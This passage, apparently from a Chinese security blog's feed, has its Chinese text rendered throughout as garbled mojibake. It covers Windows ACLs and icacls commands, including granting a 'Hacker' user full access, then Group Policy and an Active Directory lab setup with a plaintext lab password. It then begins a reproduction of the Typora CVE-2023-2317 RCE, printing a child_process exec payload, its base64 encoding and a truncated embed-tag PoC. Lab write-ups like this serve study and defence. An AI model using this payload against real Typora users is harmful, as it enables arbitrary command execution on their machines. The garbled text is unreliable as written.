‡è¯†äº†å…è®¸æˆ–æ‹’ç»è®¿é—®è¯¥å®‰å…¨å¯¹è±¡çš„å®‰å…¨ä¸»ä½“ã€‚<br>3.å¦‚æœå®‰å…¨å¯¹è±¡æ²¡æœ‰é…ç½®DACL,åˆ™ç³»ç»Ÿé»˜è®¤å…è®¸æ‰€æœ‰è®¿é—®æ“ä½œ<br>å¦‚æœé…ç½®äº†DACLæ²¡æœ‰é…ç½®ACEæ¡ç›®,ç³»ç»Ÿé»˜è®¤æ‹’ç»æ‰€æœ‰è®¿é—®æ“ä½œ<br>å¦‚æœç³»ç»Ÿé…ç½®äº†DACLå’ŒACE,é‚£ä¹ˆç³»ç»Ÿå°†æŒ‰é¡ºåºè¯»å–ACE,ç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªå…è®¸æˆ–æ‹’ç»å®‰å…¨å¯¹è±¡è®¿é—®è¡Œä¸ºçš„ACEã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308310923359.png"></p><h4 id="2-2-SACL"><a href="#2-2-SACL" class="headerlink" title="2.2 SACL"></a>2.2 SACL</h4><p>1.SACL(ç³»ç»Ÿè®¿é—®æ§åˆ¶åˆ—è¡¨)æ˜¯å®‰å…¨ä¸»ä½“å¯¹å®‰å…¨å¯¹è±¡çš„è®¿é—®è¡Œä¸ºçš„å®¡è®¡ç­–ç•¥,ä¹Ÿæ˜¯ç”±ä¸€æ¡æ¡ACEæ¡ç›®æ„æˆã€‚<br>2.æ¯æ¡ACEå®šä¹‰äº†å¯¹å“ªäº›å®‰å…¨ä¸»ä½“çš„å“ªäº›è®¿é—®è¡Œä¸ºè¿›è¡Œæ—¥å¿—è®°å½•ã€‚å®‰å…¨ä¸»ä½“çš„è®¿é—®è¡Œä¸ºæ»¡è¶³è¿™æ¡ACEå°±ä¼šè¢«è®°å½•ã€‚<br>å¯ä»¥æŠŠä¸€æ¡ACEå½’çº³ä¸º4æ–¹é¢: 1.è°å¯¹è¿™ä¸ªå®‰å…¨å¯¹è±¡æ‹¥æœ‰æ§åˆ¶æƒé™ 2.æ‹¥æœ‰ä»€ä¹ˆæƒé™ 3. è¿™ä¸ªæƒé™æ˜¯å…è®¸è¿˜æ˜¯æ‹’ç» 4. è¿™ä¸ªæƒé™èƒ½ä¸èƒ½ç»§æ‰¿</p><h4 id="2-3-æŸ¥çœ‹ä¸ä¿®æ”¹è®¿é—®æ§åˆ¶åˆ—è¡¨"><a href="#2-3-æŸ¥çœ‹ä¸ä¿®æ”¹è®¿é—®æ§åˆ¶åˆ—è¡¨" class="headerlink" title="2.3 æŸ¥çœ‹ä¸ä¿®æ”¹è®¿é—®æ§åˆ¶åˆ—è¡¨"></a>2.3 æŸ¥çœ‹ä¸ä¿®æ”¹è®¿é—®æ§åˆ¶åˆ—è¡¨</h4><p>Icacls æ˜¯ä¸€ç§å‘½ä»¤è¡Œå·¥å…·,ä½¿ç”¨icaclså‘½ä»¤å¯ä»¥æŸ¥çœ‹æˆ–ä¿®æ”¹æŒ‡å®šæ–‡ä»¶ä¸Šçš„è®¿é—®æ§åˆ¶åˆ—è¡¨,å¹¶å°†å­˜å‚¨çš„DACLåº”ç”¨äºæŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶ã€‚</p><p>ä¾‹å¦‚,æ‰§è¡Œä»¥ä¸‹å‘½ä»¤:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls C:\Users\Alice\Desktop\test.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308310927909.png"></p><p>æƒé™è¯´æ˜:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308310929931.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308310929523.png"></p><p>å°†æŒ‡å®šç›®å½•åŠå­ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„ACLlå¤‡ä»½åˆ°AcFile.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls C:\USers\Alice\Desktop\* /save AcFile.txt /T</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308310933307.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311324551.png"></p><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å°†AcFile.txtå†…æ‰€æœ‰å¤‡ä»½çš„æ–‡ä»¶ACLè¿˜åŸåˆ°æŒ‡å®šç›®å½•åŠå­ç›®å½•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls C:\Users\Alice\Desktop\ /restore AcFile.txt</span><br></pre></td></tr></table></figure><p>ç»™ç”¨æˆ·Hackeræ·»åŠ æŒ‡å®šæ–‡ä»¶æˆ–ç›®å½•çš„å®Œå…¨è®¿é—®æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls C:\Users\Alice\Desktop\Test /grant Hacker:(OI)(CI)(F) /t</span><br></pre></td></tr></table></figure><p>OI ä»£è¡¨å¯¹è±¡é›†æˆ CIä»£è¡¨å®¹å™¨é›†æˆ F ä»£è¡¨å®Œå…¨è®¿é—®</p><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤åˆ é™¤Hackerå¯¹æŒ‡å®šæ–‡ä»¶æˆ–ç›®å½•çš„å®Œå…¨è®¿é—®æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icaclas C:\Users\Alice\Desktop\Test /remove Hacker /t</span><br></pre></td></tr></table></figure><h2 id="6-ç»„ç­–ç•¥"><a href="#6-ç»„ç­–ç•¥" class="headerlink" title="6.ç»„ç­–ç•¥"></a>6.ç»„ç­–ç•¥</h2><p>ç»„ç­–ç•¥æ˜¯Windowsç¯å¢ƒä¸‹ç®¡ç†è´¦æˆ·çš„ä¸€ç§æ‰‹æ®µ,å¯ä»¥æ§åˆ¶ç”¨æˆ·è´¦æˆ·å’Œè®¡ç®—æœºè´¦æˆ·çš„å·¥ä½œç¯å¢ƒã€‚ç»„ç­–ç•¥æä¾›äº†æ“ä½œç³»ç»Ÿã€åº”ç”¨ç¨‹åºå’Œæ´»åŠ¨ç›®å½•ä¸­ç”¨æˆ·è®¾ç½®çš„é›†ä¸­åŒ–ç®¡ç†å’Œé…ç½®ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311814326.png"><br>1.æœ¬åœ°ç»„ç­–ç•¥æ˜¯ç»„ç­–ç•¥åŸºæœ¬ç‰ˆæœ¬ï¼Œé€‚ç”¨äºç®¡ç†ç‹¬ç«‹ä¸”éåŸŸç¯å¢ƒçš„è®¡ç®—æœº<br>2.åŸŸç¯å¢ƒä¸­çš„ç»„ç­–ç•¥é€‚ç”¨äºç®¡ç†åŸŸç¯å¢ƒçš„æ‰€æœ‰å¯¹è±¡ï¼ŒåŒ…æ‹¬æ‰€æœ‰ç”¨æˆ·å’Œè®¡ç®—æœºï¼Œå¯å¯¹åŸŸç¯å¢ƒä¸­çš„æ‰€æœ‰ç”¨æˆ·å’Œè®¡ç®—æœºç­‰å¯¹è±¡è¿›è¡Œå¤šç»´ç®¡ç†ï¼Œå¦‚å®‰å…¨é…ç½®ã€åº”ç”¨ç¨‹åºå®‰è£…é…ç½®ã€å¼€å…³æœºç­‰</p><h4 id="6-1ç»„ç­–ç•¥å¯¹è±¡"><a href="#6-1ç»„ç­–ç•¥å¯¹è±¡" class="headerlink" title="6.1ç»„ç­–ç•¥å¯¹è±¡"></a>6.1ç»„ç­–ç•¥å¯¹è±¡</h4><p>ç»„ç­–ç•¥å¯¹è±¡(GPR)æ˜¯ç»„ç­–ç•¥è®¾ç½®çš„é›†åˆã€‚<br>åœ¨è®¾ç½®ç»„ç­–ç•¥æ—¶ï¼Œåªè¦å°†ç»„ç­–ç•¥å¯¹è±¡é“¾æ¥é“æŒ‡å®šç«™ç‚¹ã€åŸŸå’Œç»„ç»‡å•ä½ï¼Œå…¶ä¸­çš„ç­–ç•¥å€¼ä¾¿ä¼šåº”ç”¨åˆ°è¯¥ç«™ç‚¹ã€åŸŸå’Œç»„ç»‡å•ä½çš„æ‰€æœ‰ç”¨æˆ·å’Œè®¡ç®—æœºã€‚</p><p>ç»„ç­–ç•¥å¯¹è±¡ç”±ç»„ç­–ç•¥å®¹å™¨(GPC)å’Œç»„ç­–ç•¥æ¨¡æ¿(GPT)ä¸¤ä¸ªç»„ä»¶ç»„æˆåœ¨Windowsä¸­åˆ†åˆ«å­˜å‚¨åœ¨ä¸å­”çš„ä¸åŒä½ç½®ã€‚<br>GPCå­˜å‚¨ä¸æ´»åŠ¨ç›®å½•çš„åŸŸåˆ†åŒº<br>GPTå­˜æ”¾åœ¨ä¸æ§åˆ¶å™¨çš„%SYSTEMROOT%\SYSVOL\sysvol\åŸŸå\Policiesæ–‡ä»¶å¤¹ä¸­</p><p>å¯ä»¥é€šè¿‡ç»„ç­–ç•¥ç®¡ç†æ¥æŸ¥çœ‹å’Œç¼–è¾‘æ¯ä¸ªGPOçš„è®¾ç½®<br>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªé»˜è®¤ç»„ç­–ç•¥å¯¹è±¡Default Domain Policy å’Œ Default Domain Controller Policy,ä»–ä»¬åœ¨åŸŸæ§è¢«åˆ›å»ºæ—¶è‡ªåŠ¨å»ºç«‹<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311821955.png"></p><p>(1)Default Domain Policy é»˜è®¤ç»„ç­–ç•¥å¯¹è±¡<br>Default Domain Policy åº”ç”¨åˆ°å…¶æ‰€åœ¨åŸŸçš„æ‰€æœ‰ç”¨æˆ·å’Œè®¡ç®—æœº<br>å³é”®è¯¥ç»„ç­–ç•¥å¯ä»¥ä¿å­˜æŠ¥å‘Š,ä¿å­˜ç±»å‹å¯ä»¥ä¸ºHTMLæˆ–XML.<br>å³é”®é€‰æ‹©ç¼–è¾‘å¯ä»¥æ‰“å¼€ç»„ç­–ç•¥ç¼–è¾‘å™¨<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311824303.png"></p><p>ç»„ç­–ç•¥ç¼–è¾‘å™¨å¯ä»¥åˆ†åˆ«å¯¹è¯¥ç»„ç­–ç•¥é“¾æ¥åˆ°çš„ä½œç”¨äºçš„ç”¨æˆ·å’Œè®¡ç®—æœºè¿›è¡Œé…ç½®,åˆ†ä¸ºç­–ç•¥å’Œé¦–é€‰é¡¹ä¸¤ç§ä¸åŒå¼ºåˆ¶ç¨‹åº¦ã€‚ç­–ç•¥é…ç½®æ˜¯å¼ºåˆ¶æ€§çš„é…ç½®ï¼Œä½œç”¨åŸŸä¸­çš„å®¢æˆ·ç«¯åº”ç”¨è¿™äº›é…ç½®åå°±æ— æ³•è‡ªè¡Œæ›´æ”¹ã€‚é¦–é€‰é¡¹ç›¸å½“äºé»˜è®¤å€¼çš„ä½œç”¨æ˜¯éå¼ºåˆ¶çš„ï¼Œå®¢æˆ·ç«¯å¯ä»¥è‡ªè¡Œæ›´æ”¹å…¶ä¸­çš„é…ç½®å€¼ã€‚</p><p>(2)Default Domain Controllers Policy é»˜è®¤ç»„ç­–ç•¥å¯¹è±¡<br>Default Domain Controllers Policy åº”ç”¨é“Domain Controllers ä¸­æ‰€æœ‰çš„ç”¨æˆ·å’Œè®¡ç®—æœº</p><h5 id="ç»„ç­–ç•¥å®¹å™¨"><a href="#ç»„ç­–ç•¥å®¹å™¨" class="headerlink" title="ç»„ç­–ç•¥å®¹å™¨"></a>ç»„ç­–ç•¥å®¹å™¨</h5><p>ç»„ç­–ç•¥å®¹å™¨å­˜å‚¨åœ¨æ´»åŠ¨ç›®å½•çš„ä¸åˆ†åŒºä¸­ï¼Œè·¯å¾„ä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CN=Policies, CN=System, DC=hack-my, DC=com</span><br></pre></td></tr></table></figure><p>GPCä¸­è®°å½•ç€è¯¥ç»„ç­–ç•¥å¯¹è±¡çš„ç­–ç•¥åç§°ã€æ ‡è¯†ç»„ç­–ç•¥çš„GUIDã€ç»„ç­–ç•¥é“¾æ¥åˆ°çš„ä½œç”¨åŸŸã€ç»„ç­–ç•¥æ¨¡æ¿çš„è·¯å¾„ã€ç»„ç­–ç•¥çš„ç‰ˆæœ¬ä¿¡æ¯ç­‰å„ç§å…ƒæ•°æ®ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311834919.png"><br>displayNameä¸ºç»„ç­–ç•¥åç§°, è¯¥ç»„ç­–ç•¥åä¸ºDefault Domain Policy<br>gPCFileSysPathå±æ€§ä¸ºç»„ç­–ç•¥æ¨¡æ¿å­˜æ”¾çš„è·¯å¾„,è¯¥ç»„ç­–ç•¥æ¨¡æ¿å­˜æ”¾è·¯å¾„ä¸º\\hack-my.com\sysvol\hack-my.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}</p><p>å½“åŸŸä¸­æŸå¯¹è±¡åº”ç”¨æŸç»„ç­–ç•¥æ—¶,è¯¥å¯¹è±¡çš„gPLinkå±æ€§å€¼å°†æŒ‡å‘è¿™æ¡ç»„ç­–ç•¥çš„å®Œæ•´DN<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311838884.png"><br>å›¾ä¸­DC&#x3D;hack-my, DC&#x3D;com åº”ç”¨äº†Default Domain Policy ç»„ç­–ç•¥,æ‰€ä»¥è¯¥ç»„ç»‡å•ä½çš„gPLinkå±æ€§å€¼æŒ‡å‘äº†Default Domain Policy ç»„ç­–ç•¥çš„å®Œæ•´DN</p><h5 id="ç»„ç­–ç•¥æ¨¡æ¿"><a href="#ç»„ç­–ç•¥æ¨¡æ¿" class="headerlink" title="ç»„ç­–ç•¥æ¨¡æ¿"></a>ç»„ç­–ç•¥æ¨¡æ¿</h5><p>GPTå­˜å‚¨è¯¥ç»„ç­–ç•¥å®é™…çš„é…ç½®æ•°æ®ï¼Œè¢«å­˜æ”¾åœ¨åŸŸæ§åˆ¶å™¨çš„å…±äº«ç›®å½•ã€‚%SYSTEMROOT%\SYSVOL\sysvol\åŸŸå\Policiesä¸‹ä»¥GUIDå‘½åçš„æ–‡ä»¶å¤¹ä¸­</p><p>ä»¥GUIDæ ‡è¯†çš„å„ç»„ç­–ç•¥é…ç½®ç›®å½•ä¸­åŒ…å«ä»¥ä¸‹å†…å®¹<br>MACHINE: è¯¥æ–‡ä»¶åŒ…å«ä¸€äº›é’ˆå¯¹è¯¥ç»„ç­–ç•¥çš„æ•´ä¸ªä½œç”¨åŸŸä¸­è®¡ç®—æœºçš„å…·ä½“é…ç½®ã€‚<br>USER: è¯¥æ–‡ä»¶åŒ…å«ä¸€äº›é’ˆå¯¹è¯¥ç»„ç­–ç•¥çš„æ•´ä¸ªä½œç”¨åŸŸä¸­ç”¨æˆ·çš„ä¿¡æ¯ã€‚<br>GPT.INI: è¯¥æ–‡ä»¶åŒ…å«ä¸€äº›å…³äºè¯¥ç»„ç­–ç•¥çš„ç­–ç•¥åç§°ã€ç‰ˆæœ¬ä¿¡æ¯ç­‰é…ç½®ä¿¡æ¯ã€‚</p><h4 id="6-2-ç»„ç­–ç•¥çš„åˆ›å»º"><a href="#6-2-ç»„ç­–ç•¥çš„åˆ›å»º" class="headerlink" title="6.2 ç»„ç­–ç•¥çš„åˆ›å»º"></a>6.2 ç»„ç­–ç•¥çš„åˆ›å»º</h4><p>åˆ›å»ºä¸€ä¸ªæ–°çš„ç»„ç­–ç•¥,å¹¶å°†å…¶åº”ç”¨ä¸€ä¸ªé¢„å…ˆåˆ›å»ºçš„ç»„ç»‡å•ä½â€ç§‘ç ”ä¸­å¿ƒâ€.</p><p>å³é”® ç»„ç­–ç•¥å¯¹è±¡<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311840165.png"></p><p>éšä¾¿å–åä¸ºTest Domain Policy<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311842040.png"></p><p>å³é”®hack-my.com åˆ›å»ºç»„ç»‡å•ä½å‘½åä¸ºç§‘ç ”éƒ¨é—¨<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311843472.png"></p><p>å³é”®ç§‘ç ”éƒ¨é—¨,é€‰æ‹©é“¾æ¥ç°æœ‰GPO,é€‰æ‹©Test Domain Policy<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311844507.png"></p><p>æ­¤æ—¶Test Domain Policyå·²ç»è¢«é“¾æ¥åˆ°äº†ç§‘ç ”éƒ¨é—¨ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311848550.png"><br>æ¥ç€å¯ä»¥ç¼–è¾‘è¿™æ¡ç»„ç­–ç•¥ï¼Œä¾‹å¦‚å°†è¿™æ¡ç»„ç­–ç•¥ä¸­çš„ç”¨æˆ·å¯†ç é•¿åº¦æœ€å°é•¿åº¦ä¸º7<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308311849168.png"></p><h2 id="7-å†…ç½‘ç¯å¢ƒæ­å»º"><a href="#7-å†…ç½‘ç¯å¢ƒæ­å»º" class="headerlink" title="7.å†…ç½‘ç¯å¢ƒæ­å»º"></a>7.å†…ç½‘ç¯å¢ƒæ­å»º</h2><p>windowsé•œåƒä¸‹è½½åœ°å€: <a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></p><h3 id="å•åŸŸç¯å¢ƒæ­å»º"><a href="#å•åŸŸç¯å¢ƒæ­å»º" class="headerlink" title="å•åŸŸç¯å¢ƒæ­å»º"></a>å•åŸŸç¯å¢ƒæ­å»º</h3><p>ç½‘ç»œç¯å¢ƒæ‹“è¡¥<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308271255081.png"></p><h4 id="1-Windows-Server-2012-DC"><a href="#1-Windows-Server-2012-DC" class="headerlink" title="1.Windows Server 2012 -DC"></a>1.Windows Server 2012 -DC</h4><p>1.ç½‘ç»œé…ç½®</p><p>IP: 192.168.89.10<br>å­ç½‘æ©ç : 255.255.255.0<br>é»˜è®¤ç½‘å…³: 192.168.89.1<br>DNSæŒ‡å‘æœ¬æœºIP: 192.168.89.10<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291633039.png"></p><p>2.ä¸»æœºå±æ€§è®¾ç½®<br>ä¸»æœºå: DC<br>åŸŸ: hack-my.com<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308271305344.png"></p><p>æœåŠ¡å™¨ç®¡ç†å™¨-&gt;æ·»åŠ è§’è‰²å’ŒåŠŸèƒ½<br>é»˜è®¤ä¸‹ä¸€æ­¥,ç›´åˆ°å‡ºç°é€‰æ‹©æœåŠ¡å™¨è§’è‰²çš„æ­¥éª¤,åœ¨è§’è‰²ä¸­å‹¾é€‰DNSæœåŠ¡å™¨å’ŒActive DirectoryåŸŸæœåŠ¡<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308271311038.png"></p><p>å‹¾é€‰å¦‚æœéœ€è¦,è‡ªåŠ¨é‡å¯æœåŠ¡å™¨<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308271435823.png"></p><p>è¿™é‡Œæˆ‘é€‰æ‹©å®‰è£…åæŠŠè™šæ‹Ÿæœºé‡å¯äº†<br>éœ€è¦æŒ‡å®šå‡çº§ä¸ºåŸŸæ§<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291420382.png"><br>å†™å…¥åŸŸåhack-my.com<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291422934.png"></p><p>è®¾å®šDSRM(ç›®å½•æœåŠ¡è¿˜åŸæ¨¡å¼,å…è®¸ç®¡ç†å‘˜åœ¨åŸŸç¯å¢ƒå‡ºæ•…éšœæ—¶è¿˜åŸç›®å½•æ•°æ®åº“)å¯†ç <br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291424520.png"></p><p>ä¹‹åä¿æŒé»˜è®¤ä¸‹ä¸€æ­¥<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291429215.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291430888.png"></p><p>å‘ç°éœ€è¦é‡ç½®Administratorçš„å¯†ç <br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291433261.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291435266.png"><br>å†æ¬¡æ£€æŸ¥å…ˆå†³æ¡ä»¶,å®‰è£…å³å¯<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291436956.png"></p><p>å®‰è£…æˆåŠŸå,é‡æ–°å¯åŠ¨æœåŠ¡å™¨,åˆ‡æ¢è‡³Administratorç™»å½•<br>å‘ç°AD DS å’Œ DNS å®‰è£…æˆåŠŸ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291549738.png"></p><p>æŠŠDNSæ”¹å› 192.168.89.10</p><p>ä¸ºäº†èƒ½è®©åç»­åŠ å…¥åŸŸä¸­çš„Windows Server 2008 å’Œ Windows 7 ç”¨æˆ·å¯ä»¥æ­£å¸¸ç™»å½•,ä¸ºä»–ä»¬åˆ›å»ºåŸŸç”¨æˆ·<br>æ‰“å¼€æœåŠ¡å™¨ç®¡ç†å™¨-&gt;å·¥å…·-&gt;Active Directory ç”¨æˆ·å’Œè®¡ç®—æœº, é€‰ä¸­Usersç›®å½•å¹¶å•å‡»å³é”®<br>æ–°å»ºç”¨æˆ·Alice,å¹¶è®¾ç½®å…¶å¯†ç æ°¸ä¸è¿‡æœŸ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291559165.png"><br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291601871.png"></p><p>Alice - ==xy159753<br>æˆåŠŸåˆ›å»ºç”¨æˆ·Alice<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291604100.png"></p><h4 id="2-Windows-Server-2008-Web"><a href="#2-Windows-Server-2008-Web" class="headerlink" title="2.Windows Server 2008 - Web"></a>2.Windows Server 2008 - Web</h4><p>å…ˆæ”¹ç½‘ç»œè®¾ç½®<br>ip: 192.168.89.20<br>å­ç½‘æ©ç : 255.255.255.0<br>é»˜è®¤ç½‘å…³:192.168.89.1<br>DNS: 192.168.89.10<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291631784.png"></p><p>å°†è¯¥ä¸»æœºæ·»åŠ å€¼åŸŸä¸­<br>æ§åˆ¶é¢æ¿-&gt;ç³»ç»Ÿ-&gt;æ”¹å˜è®¾ç½®<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291638603.png"></p><p>ç™»å½•åŸŸç”¨æˆ·<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291640421.png"></p><p>æˆåŠŸåŠ å…¥åŸŸ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291641456.png"></p><h4 id="3-Windows-7"><a href="#3-Windows-7" class="headerlink" title="3.Windows 7"></a>3.Windows 7</h4><p>å‚ç…§Windows Server 2008 åŠ å…¥åŸŸç¯å¢ƒ<br>IP: 192.168.89.30<br>å­ç½‘æ©ç : 255.255.255.0<br>ç½‘å…³: 192.168.89.1</p><p>DNS: 192.168.89.10<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302044079.png"></p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302045994.png"></p><p>ç™»å½•å,æˆåŠŸåŠ å…¥hack-my.comåŸŸ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308302047083.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°</title>
      <link href="/2023/08/29/Typora%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/08/29/Typora%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="Typora-è¿œç¨‹ä»£ç æ‰§è¡Œ-CVE-2023-2317"><a href="#Typora-è¿œç¨‹ä»£ç æ‰§è¡Œ-CVE-2023-2317" class="headerlink" title="Typora è¿œç¨‹ä»£ç æ‰§è¡Œ-CVE-2023-2317"></a>Typora è¿œç¨‹ä»£ç æ‰§è¡Œ-CVE-2023-2317</h1><h2 id="1-äº§å“ç®€ä»‹"><a href="#1-äº§å“ç®€ä»‹" class="headerlink" title="1.äº§å“ç®€ä»‹"></a>1.äº§å“ç®€ä»‹</h2><p>Typoraæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§ä¸”æ˜“äºä½¿ç”¨çš„ç¬”è®°è½¯ä»¶ï¼Œå®ƒæ—¨åœ¨ä¸ºç”¨æˆ·æä¾›ç®€æ´ã€æ— å¹²æ‰°çš„å†™ä½œå’Œé˜…è¯»ä½“éªŒã€‚<br>Typoraæ”¯æŒå¤šç§å¸¸ç”¨çš„æ ‡è®°è¯­è¨€ï¼Œå¦‚Markdownã€AsciiDocç­‰ã€‚Markdownæ˜¯ä¸€ç§è½»é‡çº§æ ‡è®°è¯­è¨€ï¼Œè¢«å¹¿æ³›ç”¨äºå†™ä½œã€ç¼–å†™æ–‡æ¡£å’Œåšå®¢ç­‰åœºæ™¯ã€‚Typoraå†…ç½®äº†å¯¹Markdownçš„å®Œæ•´æ”¯æŒï¼Œä½¿å¾—ä½ å¯ä»¥ä½¿ç”¨Markdownè¯­æ³•å¿«é€Ÿåˆ›å»ºæ ‡é¢˜ã€åˆ—è¡¨ã€é“¾æ¥ã€è¡¨æ ¼ç­‰å„ç§æ ¼å¼ï¼Œå¹¶èƒ½å¤Ÿå®æ—¶é¢„è§ˆæœ€ç»ˆçš„æ¸²æŸ“æ•ˆæœã€‚</p><h2 id="2-æ¼æ´æ¦‚è¿°"><a href="#2-æ¼æ´æ¦‚è¿°" class="headerlink" title="2.æ¼æ´æ¦‚è¿°"></a>2.æ¼æ´æ¦‚è¿°</h2><p>1.6.7ç‰ˆæœ¬ä»¥å‰çš„Typoraä¸­çš„updater&#x2F;update.htmlä¸­å­˜åœ¨DOMå‹XSS,è¯¥æ¼æ´å…è®¸é€šè¿‡åŠ è½½ç‰¹åˆ¶mdæ–‡ä»¶ä»è€Œæ‰§è¡Œjsä»£ç ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„mdæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«å¼•ç”¨update.htmlçš„&lt;embed&gt;æ ‡ç­¾,ä½¿ç”¨ç‰¹æƒæ¥å£reqnodeè®¿é—®èŠ‚ç‚¹æ¨¡å—child_processä»è€Œæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</p><h2 id="3-å½±å“èŒƒå›´"><a href="#3-å½±å“èŒƒå›´" class="headerlink" title="3.å½±å“èŒƒå›´"></a>3.å½±å“èŒƒå›´</h2><p>Typoraç‰ˆæœ¬ &lt; 1.6.7</p><h2 id="4-å¤ç°è¿‡ç¨‹"><a href="#4-å¤ç°è¿‡ç¨‹" class="headerlink" title="4.å¤ç°è¿‡ç¨‹"></a>4.å¤ç°è¿‡ç¨‹</h2><p>å¤ç°ç¯å¢ƒ:<br>Typora ç‰ˆæœ¬ 1.3.8</p><p>reqnodeç‰¹æƒæ¥å£è°ƒç”¨è®¿é—®child_processæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reqnode(&#x27;child_process&#x27;).exec((&#123;Win32: &#x27;calc&#x27;, Linux: &#x27;gnome-calculator -e &quot;Typora RCE PoC&quot;&#x27;&#125;)[navigator.platform.substr(0,5)])</span><br></pre></td></tr></table></figure><p>base64åŠ å¯†<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308291348942.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ2NhbGMnLCBMaW51eDogJ2dub21lLWNhbGN1bGF0b3IgLWUgIlR5cG9yYSBSQ0UgUG9DIid9KVtuYXZpZ2F0b3IucGxhdGZvcm0uc3Vic3RyKDAsNSldKQ==</span><br></pre></td></tr></table></figure><p>æ„é€ POC</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">style</span>=<span class="string">&quot;height:0;&quot;</span> <span class="attr">src</span>=<span 